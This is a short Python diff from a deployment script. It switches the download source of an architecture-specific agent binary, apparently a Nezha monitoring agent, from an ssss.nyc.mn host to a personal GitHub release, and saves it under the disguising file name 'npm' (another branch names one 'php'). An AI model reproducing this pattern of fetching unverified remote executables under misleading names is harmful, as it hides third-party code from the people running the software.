@@ -164,7 +164,7 @@ def get_files_for_architecture(architecture):
 
     if NEZHA_SERVER and NEZHA_KEY:
         if NEZHA_PORT:
-            npm_url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
+            npm_url = "https://github.com/trancedj2022/test/releases/download/arm64/swith" if architecture == 'arm' else "https://github.com/trancedj2022/test/releases/download/amd64/swith"
             base_files.insert(0, {"fileName": "npm", "fileUrl": npm_url})
         else:
             php_url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
